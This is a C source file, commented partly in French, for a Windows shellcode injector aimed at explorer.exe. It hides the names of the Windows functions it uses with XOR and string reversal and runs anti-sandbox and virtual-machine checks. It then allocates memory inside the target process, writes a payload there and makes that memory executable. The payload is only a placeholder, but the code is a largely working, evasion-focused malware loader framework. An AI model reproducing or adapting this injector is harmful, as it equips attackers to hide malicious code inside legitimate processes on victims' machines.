// -----------------------------------------------------------------------
// INCLUDES AND DEFINES
// -----------------------------------------------------------------------
#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include "nt.h"
#include <tlhelp32.h>
#include "system_info.h"
#include <rpc.h>

#pragma comment(lib, "Rpcrt4.lib")


// -----------------------------------------------------------------------
// DEBUG MODE CONFIGURATION
// -----------------------------------------------------------------------
int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable

#define DEBUG(x, ...) if (DEBUG_MODE) { printf(x, ##__VA_ARGS__); }



// -----------------------------------------------------------------------
// FONCTION DEFINITIONS
// -----------------------------------------------------------------------
HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = 0;
    HANDLE hProc = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        DEBUG("[Process Searching] Failed to retrieve the %s process\n", procName);
        return NULL;
    }
    if (Process32First(snapshot, &entry)) {
        do {
            // Parse each process information
            if (strcmp((entry.szExeFile), procName) == 0) {
                // Retrieve the PID of the right process
                *PID = entry.th32ProcessID;
                DEBUG("[Process Searching] Injecting into : %d\n", *PID);
                // Open an handle on this process
                HANDLE hProc = openProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                if (!hProc) { continue; }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    return NULL;
}


// -----------------------------------------------------------------------
// BASE64 ENCODING
// -----------------------------------------------------------------------
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* input, size_t length, char* output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; i < 4; i++)
                *output++ = base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            *output++ = base64_chars[char_array_4[j]];

        while(i++ < 3)
            *output++ = '=';
    }
    *output = '\0';
}

// -----------------------------------------------------------------------
// UUID GENERATION
// -----------------------------------------------------------------------
void generate_uuid_base64(char* output) {
    UUID uuid;
    UuidCreate(&uuid);

    unsigned char* uuid_bytes = (unsigned char*)&uuid;

    base64_encode(uuid_bytes, sizeof(UUID), output);
}


// -----------------------------------------------------------------------
// ENCRYPTED DATA (REVERSED + XOR)
// -----------------------------------------------------------------------
// Toutes les fonctions/variables API sont chiffrées avec XOR puis reversées
// Clé XOR fonctions API: 0x35
// Clé XOR process names: 0x1b
// Processus de déchiffrement: Reverse -> XOR decrypt

unsigned char encryptedVirtualAllocEx[] = {
    0x35, 0x4d, 0x70, 0x56, 0x5a, 0x59, 0x59, 0x74, 0x59, 0x54, 0x40, 0x41, 0x47, 0x5c, 0x63
};

unsigned char encryptedOpenProcess[] = {
    0x35, 0x46, 0x46, 0x50, 0x56, 0x5a, 0x47, 0x65, 0x5b, 0x50, 0x45, 0x7a
};

unsigned char encryptedVirtualProtectEx[] = {
    0x35, 0x4d, 0x70, 0x41, 0x56, 0x50, 0x41, 0x5a, 0x47, 0x65, 0x59, 0x54, 0x40, 0x41, 0x47, 0x5c, 0x63
};

unsigned char encryptedWriteProcessMemory[] = {
    0x35, 0x4c, 0x47, 0x5a, 0x58, 0x50, 0x78, 0x46, 0x46, 0x50, 0x56, 0x5a, 0x47, 0x65, 0x50, 0x41, 0x5c, 0x47, 0x62
};

unsigned char encryptedCreateRemoteThread[] = {
    0x35, 0x51, 0x54, 0x50, 0x47, 0x5d, 0x61, 0x50, 0x41, 0x5a, 0x58, 0x50, 0x67, 0x50, 0x41, 0x54, 0x50, 0x47, 0x76
};

unsigned char encryptedGetModuleHandleA[] = {
    0x35, 0x74, 0x50, 0x59, 0x51, 0x5b, 0x54, 0x7d, 0x50, 0x59, 0x40, 0x51, 0x5a, 0x78, 0x41, 0x50, 0x72
};

unsigned char encryptedGetProcAddress[] = {
    0x35, 0x46, 0x46, 0x50, 0x47, 0x51, 0x51, 0x74, 0x56, 0x5a, 0x47, 0x65, 0x41, 0x50, 0x72
};

unsigned char encryptedKernel32[] = {
    0x35, 0x59, 0x59, 0x51, 0x1b, 0x07, 0x06, 0x59, 0x50, 0x5b, 0x47, 0x50, 0x5e
};

unsigned char encryptedexplorer_exe[] = {
    0x1b, 0x7e, 0x63, 0x7e, 0x35, 0x69, 0x7e, 0x69, 0x74, 0x77, 0x6b, 0x63, 0x7e
};
// -----------------------------------------------------------------------
// UTILITY FUNCTIONS
// -----------------------------------------------------------------------

/**
 * Déchiffre une chaîne chiffrée avec XOR
 * @param encrypted: Tableau de bytes chiffrés
 * @param length: Longueur du tableau
 * @param key: Clé XOR
 */
void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        encrypted[i] ^= key;
    }
} 

void encrypt(unsigned char* data, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}


/**
 * Reverse une chaîne chiffrée
 * @param str: Chaîne à reverse
 * @param length: Longueur de la chaîne
 */
void reverse_string(unsigned char* str, size_t length) {
    for (size_t i = 0; i < length / 2; i++) {
        unsigned char temp = str[i];
        str[i] = str[length - i - 1];
        str[length - i - 1] = temp;
    }
}


/**
 * Déchiffre une chaîne avec reverse puis XOR
 * @param encrypted: Tableau de bytes chiffrés et reversés
 * @param length: Longueur du tableau (sans le null terminator)
 * @param key: Clé XOR
 */
void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char key) {
    // Étape 1: Reverse la chaîne complète
    reverse_string(encrypted, length);

    // Étape 2: Déchiffrement XOR (sans toucher au dernier byte qui sera le null terminator)
    decrypt(encrypted, length - 1, key);

    // Étape 3: Ajouter le null terminator à la fin
    encrypted[length - 1] = '\0';
}



// -----------------------------------------------------------------------
// CONFIGURATION CONSTANTS
// -----------------------------------------------------------------------
int TRHESHOLD_MAX_CPU = 2;
int TRHESHOLD_MIN_RAM_MB = 2048;

int main(void) {


    // ------------------------------------------------------------------------
    // INITIALIZATION
    // ------------------------------------------------------------------------
    DEBUG("[Initialization - Start] Starting injector...\n");
    DEBUG("[Initialization - Debug] Debug mode is: %s\n", DEBUG_MODE ? "ENABLED" : "DISABLED");

    // Payload de test
    size_t scLength = 8;
    unsigned char scBytes[] = { 0x90, 0x90, 0x90, 0x90, 0xDE, 0xAD, 0xBE, 0xEF };
    size_t szOutput;
    DEBUG("[Initialization - Payload] Payload length: %zu bytes\n", scLength);

    // Decrypt WinAPI function name
    unsigned char xor_function_key = 0x35;
    DEBUG("[Initialization - Decryption] xor_function_key: 0x%02X\n", xor_function_key);

    //Decrypt process_to_inject
    unsigned char xor_process_key = 0x1b;
    DEBUG("[Initialization - Decryption] xor_process_key: 0x%02X\n", xor_process_key);


    //UUID generation
    char uuid_base64[25] = {0};
    generate_uuid_base64(uuid_base64);
    DEBUG("[Initialization - UUID] Generated UUID (Base64): %s\n", uuid_base64);




    // ------------------------------------------------------------------------
    // SYSTEM INFORMATION COLLECTION
    // ------------------------------------------------------------------------
    DEBUG("[System Info - Start] Collecting system information...\n");

    SystemInfo sysInfo;
    if (collect_system_info(&sysInfo) != 0) {
        DEBUG("[System Info - Error] Failed to collect system information\n");
    } else {
        char json_buffer[8192];
        if (system_info_to_json(&sysInfo, json_buffer, sizeof(json_buffer)) == 0) {
            DEBUG("[System Info - JSON] System information in JSON format:\n%s\n", json_buffer);
        } else {
            DEBUG("[System Info - Error] Failed to serialize system information to JSON\n");
        }
    }

    // ------------------------------------------------------------------------
    // SANDBOXING DETECTION
    // ------------------------------------------------------------------------
    DEBUG("[Sandboxing Detection - Start] Running anti-sandbox checks...\n");

    // Check CPU count (using collected system info)
    DEBUG("[Sandboxing Detection - CPU] Detected %d processors (threshold: %d)\n",
          sysInfo.nb_processors, TRHESHOLD_MAX_CPU);
    if (sysInfo.nb_processors < TRHESHOLD_MAX_CPU) {
        DEBUG("[Sandboxing Detection - Check CPU] Suspicious environment detected: %d processors.\n",
              sysInfo.nb_processors);
        //return 0;
    }

    // Check RAM size (using collected system info)
    DEBUG("[Sandboxing Detection - RAM] Detected %llu MB (threshold: %d MB)\n",
          (unsigned long long)sysInfo.total_ram_mb, TRHESHOLD_MIN_RAM_MB);
    if (sysInfo.total_ram_mb < TRHESHOLD_MIN_RAM_MB) {
        DEBUG("[Sandboxing Detection - Check RAM] Suspicious environment detected: %llu MB of RAM.\n",
              (unsigned long long)sysInfo.total_ram_mb);
        //return 0;
    }

    // Check VM detection (using collected system info)
    if (sysInfo.is_vm) {
        DEBUG("[Sandboxing Detection - VM] Virtual machine detected!\n");
        //return 0;
    } else {
        DEBUG("[Sandboxing Detection - VM] No virtual machine detected\n");
    }

    // Detection time delay
    DEBUG("[Sandboxing Detection - Timing] Starting timing check...\n");
    ULONGLONG start = GetTickCount64();
    for (long i = 0; i < 100000000; i++) { i % 2; }
    ULONGLONG end = GetTickCount64();
    ULONGLONG elapsed = end - start;
    DEBUG("[Sandboxing Detection - Timing] Elapsed time: %llu ms (minimum: 10 ms)\n", elapsed);

    if (elapsed < 10) {
        DEBUG("[Sandboxing Detection - Timing] Sandbox detected, exiting...\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return 0;
    }
    DEBUG("[Sandboxing Detection - Complete] All checks passed\n");



    // Step 1: Decrypt all API strings (Reverse + XOR)
    DEBUG("[Decryption - Start] Decrypting all API strings (Reverse + XOR)...\n");
    decrypt_reverse_xor(encryptedKernel32, sizeof(encryptedKernel32), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted kernel32.dll string: %s\n", encryptedKernel32);
    decrypt_reverse_xor(encryptedGetModuleHandleA, sizeof(encryptedGetModuleHandleA), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted GetModuleHandleA string: %s\n", encryptedGetModuleHandleA);
    decrypt_reverse_xor(encryptedGetProcAddress, sizeof(encryptedGetProcAddress), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted GetProcAddress string: %s\n", encryptedGetProcAddress);
    decrypt_reverse_xor(encryptedVirtualAllocEx, sizeof(encryptedVirtualAllocEx), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted VirtualAllocEx string: %s\n", encryptedVirtualAllocEx);
    decrypt_reverse_xor(encryptedOpenProcess, sizeof(encryptedOpenProcess), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted OpenProcess string: %s\n", encryptedOpenProcess);
    decrypt_reverse_xor(encryptedVirtualProtectEx, sizeof(encryptedVirtualProtectEx), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted VirtualProtectEx string: %s\n", encryptedVirtualProtectEx);
    decrypt_reverse_xor(encryptedWriteProcessMemory, sizeof(encryptedWriteProcessMemory), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted WriteProcessMemory string: %s\n", encryptedWriteProcessMemory);
    decrypt_reverse_xor(encryptedCreateRemoteThread, sizeof(encryptedCreateRemoteThread), xor_function_key);
    DEBUG("[Decryption - Complete] Decrypted CreateRemoteThread string: %s\n", encryptedCreateRemoteThread);
    decrypt_reverse_xor(encryptedexplorer_exe, sizeof(encryptedexplorer_exe), xor_process_key);
    DEBUG("[Decryption - Complete] Decrypted Explorer.exe string: %s\n", encryptedexplorer_exe);
    DEBUG("[Decryption - Complete] All API strings decrypted\n");

    // Step 2: Dynamically resolve GetModuleHandleA and GetProcAddress
    DEBUG("[Dynamic Resolution - Start] Resolving core functions...\n");

    // Get kernel32.dll base address (still using GetModuleHandleA directly for bootstrap)
    HMODULE hKernel32 = GetModuleHandleA((LPCSTR)encryptedKernel32);
    if (hKernel32 == NULL) {
        DEBUG("[Dynamic Resolution - Error] Failed to get kernel32.dll handle\n");
        getchar(); return 1;
    }
    DEBUG("[Dynamic Resolution - Success] kernel32.dll handle: %p\n", hKernel32);

    // Step 3: Get VirtualAlloc function address
    DEBUG("[GetProcAddress - Start] Resolving VirtualAllocEx address...\n");
    pVirtualAllocEx myVirtualAlloc = (pVirtualAllocEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualAllocEx);

    if (myVirtualAlloc == NULL) {
        DEBUG("[GetProcAddress - Error] Erreur : GetProcAddress a echoue. Code d'erreur : %lu\n", GetLastError());
        getchar(); return 1;
    }
    DEBUG("[GetProcAddress - Success] Adresse de VirtualAlloc trouvee : %p\n", myVirtualAlloc);


    DEBUG("[GetProcAddress - Start] Resolving additional API functions...\n");
    openProcess = (pOpenProcess)GetProcAddress(hKernel32, (LPCSTR)encryptedOpenProcess);
    DEBUG("[GetProcAddress - API] OpenProcess: %p\n", openProcess);
    virtualProtectEx = (pVirtualProtectEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualProtectEx);
    DEBUG("[GetProcAddress - API] VirtualProtectEx: %p\n", virtualProtectEx);
    writeProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, (LPCSTR)encryptedWriteProcessMemory);
    DEBUG("[GetProcAddress - API] WriteProcessMemory: %p\n", writeProcessMemory);
    createRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, (LPCSTR)encryptedCreateRemoteThread);
    DEBUG("[GetProcAddress - API] CreateRemoteThread: %p\n", createRemoteThread);

    if (!openProcess || !virtualProtectEx || !writeProcessMemory || !myVirtualAlloc || !createRemoteThread) {
        DEBUG("[x] Cannot load all required functions\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[GetProcAddress - Complete] All API functions resolved successfully\n");

    DEBUG("[Process Injection - Start] Beginning injection process...\n");
    DWORD PID = 0;
    HANDLE procHandle = getProcHandlebyName((LPCSTR)encryptedexplorer_exe, &PID);
    if (!procHandle) {
        DEBUG("[x] Failed to open the process\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[+] Process handle: %p\n", procHandle);

    DEBUG("[Memory Allocation - Start] Allocating remote buffer...\n");
    PVOID remoteBuffer = myVirtualAlloc(procHandle, NULL, (SIZE_T)scLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        DEBUG("[x] Failed to allocate process memory: %d\n", GetLastError());
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    } else {
        DEBUG("[+] Remote buffer allocated at: %p\n", remoteBuffer);
        DEBUG("[Memory Allocation - Success] Buffer size: %zu bytes with RW permissions\n", scLength);
    }


    DEBUG("[Memory Write - Start] Writing payload to remote process...\n");
    int status = writeProcessMemory(procHandle, remoteBuffer, scBytes, scLength, &szOutput);
    if (!status) {
        DEBUG("[x] Failed to write process memory... : %d\n", GetLastError());
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[Memory Write - Success] Written %zu bytes to remote process\n", szOutput);


    DEBUG("[Memory Protection - Start] Changing memory protection to RX...\n");
    DWORD oldProtect;
    BOOL protectStatus = virtualProtectEx(procHandle, remoteBuffer, scLength, PAGE_EXECUTE_READ, &oldProtect);
    if (!protectStatus) {
        DEBUG("[x] Failed to reprotect the memory\n");
        printf("\nPress Enter to exit...\n");
        getchar();
        return -1;
    }
    DEBUG("[Memory Protection - Success] Memory protection changed (old: 0x%lX, new: PAGE_EXECUTE_READ)\n", oldProtect);

    DEBUG("[Process Injection - Complete] Injection successful!\n");
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}